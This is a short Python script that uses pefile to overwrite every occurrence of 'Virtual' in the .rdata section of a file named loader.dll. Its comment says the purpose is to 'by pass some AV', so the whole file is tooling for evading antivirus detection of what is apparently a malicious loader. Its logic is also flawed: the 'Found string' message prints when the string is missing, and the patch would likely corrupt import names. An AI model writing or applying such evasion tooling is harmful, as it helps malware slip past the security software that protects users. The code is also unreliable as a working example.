import pefile

# Replace string "Virtual" in .rdata section to by pass some AV
# just run python patch.py

old_str = b"Virtual"
new_str = b"Blahbla"

pe = pefile.PE("loader.dll")

rdata_found = False
for section in pe.sections:
    section_name = section.Name.rstrip(b'\x00')
    if section_name == b'.rdata':
        rdata_found = True
        print("[+] .rdata section found")
        data = section.get_data()

        if old_str not in data:
            print("[+] Found string 'Virtual'")
        else:
            new_data = data.replace(old_str, new_str)
            raw_offset = section.PointerToRawData
            pe.__data__ = pe.__data__[:raw_offset] + new_data + pe.__data__[raw_offset + len(new_data):]
            print("[+] Done!")
        break

if not rdata_found:
    print("[-] .rdata not found")

output_filename = "loader_patched.dll"
with open(output_filename, "wb") as f:
    f.write(pe.__data__)

print(f"[+] Saved to {output_filename}")
